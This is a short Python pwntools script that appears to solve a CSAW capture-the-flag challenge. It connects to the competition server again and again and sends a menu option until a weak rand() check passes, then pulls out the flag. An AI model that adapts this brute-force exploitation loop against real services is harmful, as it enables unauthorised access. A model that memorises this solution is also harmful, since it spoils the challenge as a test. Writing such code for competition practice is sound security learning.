#!/usr/bin/env python3
import sys, time
from pwn import *

context.log_level = 'info'

def attempt(host, port):
    r = remote(host, port)
    r.recvuntil(b'[5] Stay stranded', timeout=10)
    # Each '4' consumes one rand() and checks ((energy>>4)&0xf)==(rand()&0xff) -> 0 == rand&0xff
    # ~1/256 chance per attempt. Spam it.
    r.sendline(b'4')
    data = b''
    for i in range(20000):
        try:
            chunk = r.recv(timeout=2)
        except EOFError:
            break
        if not chunk:
            break
        data += chunk
        if b'csawctf{' in data:
            break
        if b'core is full of energy' in data:
            # flag follows
            try:
                data += r.recvrepeat(2)
            except EOFError:
                pass
            break
        if b'still dead as a rock' in data:
            data = b''
            r.sendline(b'4')
            continue
        # menu prompt again
        if b'[5] Stay stranded' in data:
            data = b''
            r.sendline(b'4')
    r.close()
    return data

if __name__ == '__main__':
    host = 'pwn.chal.csaw.io'
    port = 21005
    for tryno in range(5):
        try:
            out = attempt(host, port)
        except Exception as e:
            print('err', e)
            continue
        if b'csawctf{' in out:
            flag = out.split(b'csawctf{')[1].split(b'}')[0]
            print('FLAG: csawctf{' + flag.decode() + '}')
            sys.exit(0)
        print('attempt', tryno, 'no flag yet, tail:', out[-200:])
    sys.exit(1)

